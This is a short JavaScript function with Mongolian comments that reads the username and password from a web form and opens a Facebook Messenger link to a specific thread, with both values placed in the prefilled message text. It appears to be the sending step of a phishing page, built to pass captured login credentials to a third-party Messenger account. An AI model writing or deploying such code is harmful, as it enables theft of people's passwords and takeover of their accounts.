function sendToMessenger() {
    const username = document.getElementById('username').value; // Нэвтрэх нэр
    const password = document.getElementById('password').value; // Нууц үг

    // "Tulip Tulip" ID-тэй Messenger хаяг руу илгээх текст
    const message = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}`;

    // Messenger руу илгээх URL
    const messengerUrl = `https://www.messenger.com/e2ee/t/27808255922107117?text=${encodeURIComponent(message)}`;

    // Шинэ таб нээнэ
    window.open(messengerUrl, '_blank');
}
